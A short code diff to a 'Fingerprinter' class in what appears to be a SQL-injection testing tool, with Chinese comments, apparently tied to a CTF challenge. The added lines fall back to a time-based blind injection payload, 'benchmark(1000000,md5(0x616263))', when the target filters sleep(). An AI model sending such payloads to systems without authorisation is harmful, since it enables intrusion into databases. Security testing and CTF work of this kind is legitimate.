@@ -77,6 +77,13 @@ class Fingerprinter:
                 if r.elapsed_ms >= 2800:
                     fp.time_oracle = True
                     break
+            if not fp.time_oracle and not waf.is_filtered("benchmark"):
+                # sleep 被目标拦（扫描看不见，web217 类）→ benchmark 兜底
+                r = self.s.request_value(
+                    self._cond_payload("benchmark(1000000,md5(0x616263))", "or"))
+                if r.elapsed_ms >= 3000:
+                    fp.time_oracle = True
+                    notes.append("sleep 不可用，benchmark 延时可用")
         else:
             notes.append("sleep 被过滤，时间盲注判定受限")
 
